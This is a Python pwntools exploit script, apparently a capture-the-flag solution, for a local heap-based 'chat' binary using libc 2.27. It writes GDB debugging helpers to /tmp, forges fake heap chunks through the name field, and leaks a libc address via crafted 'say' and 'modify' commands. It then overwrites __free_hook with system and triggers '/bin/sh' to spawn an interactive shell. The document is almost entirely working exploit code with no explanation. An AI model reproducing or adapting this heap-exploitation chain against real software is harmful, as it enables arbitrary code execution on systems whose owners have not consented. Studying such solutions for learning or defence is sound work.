#!/usr/bin/python2
# -*- coding:utf-8 -*-

from pwn import *
import os
import struct
import random
import time
import sys

# Create a symbol file for GDB debugging
try:
    gdb_symbols = '''
    struct user
    {
        int user_num;
        int room_num;
        char * name_mmap_offset;
        struct user *next;
        void *field_18;
        char *name;
    };
    struct user user_no_use;

    struct current
    {
        int user_num;
        int room_num;
        char * name_mmap_offset;
        struct user *room_mmap_offset;
        void *field_18;
        char *user_name;
    };
    struct current current_no_use;

    struct room
    {
        long long room_num;
        char *name;
        void *field_10;
        struct room *next;
    };
    struct room room_no_use;

    struct message
    {
        long long user_num;
        long long room_num;
        char *message;
        void *field_18;
        long long is_use;
        struct message *next;
    };
    struct message message_no_use;

    struct mmap
    {
        long long user;
        long long message;
        long long room;
    };
    struct mmap mmap_no_use;
    '''

    f = open('/tmp/gdb_symbols.c', 'w')
    f.write(gdb_symbols)
    f.close()
    os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
    # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
except Exception as e:
    print(e)

context.arch = "amd64"
# context.log_level = 'debug'
execve_file = './chat'
# sh = process(execve_file, env={"LD_PRELOAD": "/tmp/gdb_symbols.so"})
sh = process(execve_file)
elf = ELF(execve_file)
libc = ELF('./libc-2.27.so')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    set $user_list=(struct user **)0x603258
    set $room_list=(struct room **)0x603120
    set $message_list=(struct message **)0x603250
    set $mmap_addr=(struct mmap **)0x603110
    set $now=(struct current **)0x603240

    define print_recv
        p *$temp
        if $temp->next
            set $temp=$temp->next
            print_recv
            end
        end

    define pru
        set $temp=*$user_list
        print_recv
        end

    define prn
        set $temp=*$now
        p $temp
        p *$temp

        set $temp=$mmap_addr
        set $temp=(struct message *) ((char *)*$mmap_addr+(long long)($temp->message))
        p $temp
        p *$temp
        p (char *)((char *)*$mmap_addr + (long long)($temp->message))
        end

    define prr
        set $temp=*$room_list
        print_recv
        end

    define prm
        set $temp=*$message_list
        print_recv
        end

    define pr
        echo user_list\\n
        p *$user_list
        pru
        echo room_list\\n
        p *$room_list
        prr
        echo message_list\\n
        prm
        end

    define prmmap
        set $temp= (struct user *)((char *)*$mmap_addr + (*$mmap_addr)->user)
        p *$temp
        p (char *)((char *)*$mmap_addr + (long long)($temp->name_mmap_offset))

        set $temp= (struct room *)((char *)*$mmap_addr + (*$mmap_addr)->room)
        p *$temp
        p (char *)((char *)*$mmap_addr + (long long)($temp->name))

        set $temp= (struct message *)((char *)*$mmap_addr + (*$mmap_addr)->message)
        p *$temp
        p (char *)((char *)*$mmap_addr + (long long)($temp->message))
        end
    
    b sync
    b *0x401FB3
    '''

    f = open('/tmp/pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdbscript', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    print(e)

sh.recvuntil("please enter your name: ")

name_addr = 0x603140

name_layout = [
    0x61616161616161, 0x61616161616161, 0x61616161616161, 0x61616161616161,
    0, 0x21, 0, 0,
    0, 0x21, 0, 0,
    0, 0x21, 0, 0,
]

sh.sendline(flat(name_layout))
sh.recvuntil("help\n==========================================\n")

sh.sendline('enter ' + 'b' * 0x58)
sh.recvuntil('==============================================================')
# offset = 0x41d000 - 0x10 # _GLOBAL_OFFSET_TABLE_+16
offset = 0x21d000 - 0x10 # _GLOBAL_OFFSET_TABLE_+16


# pause()
sh.sendline('say ' + p64(0x10000000000000000 - offset))
sh.recvuntil('==============================================================')
# pause()
sh.sendline('')
sh.recvuntil(': ')
result = sh.recvuntil('\n')[:-1]

# You should calculate the value by yourself
# value_offset = 0x408750 + 0x202000
value_offset = 0x408750
libc_addr = u64(result.ljust(8, '\0')) - value_offset
log.success("libc_addr: " + hex(libc_addr))

sh.sendline('')

# pause()
sh.sendline('modify ' + 'd' * 8 + p64(0x10000000000000000 - offset) + 'd' * 0x10 + p64(name_addr + 0x40 + 0x10))
sh.recvuntil('==============================================================')

sh.sendline('modify ' + 'e' * 0x78)
sh.recvuntil('==============================================================')


sh.sendline('')
sh.recvuntil('==============================================================')

sh.sendline('')
sh.recvuntil('==============================================================')


# pause()
sh.sendline('modify ' + p64(libc_addr + libc.symbols['__free_hook']))
sh.recvuntil('==============================================================')

sh.send("say " + 'f' * 0x17)
sh.recvuntil('==============================================================')

# pause()
sh.send("say " + p64(libc_addr + libc.symbols['system']))
sh.recvuntil('==============================================================')

sh.send("say " + '/bin/sh\0')
sh.recvuntil('==============================================================')
sh.send("say " + '/bin/sh\0')
sh.recvuntil('==============================================================')
sh.send("say " + '/bin/sh\0')
sh.recvuntil('==============================================================')
sh.sendline('')


sh.interactive()
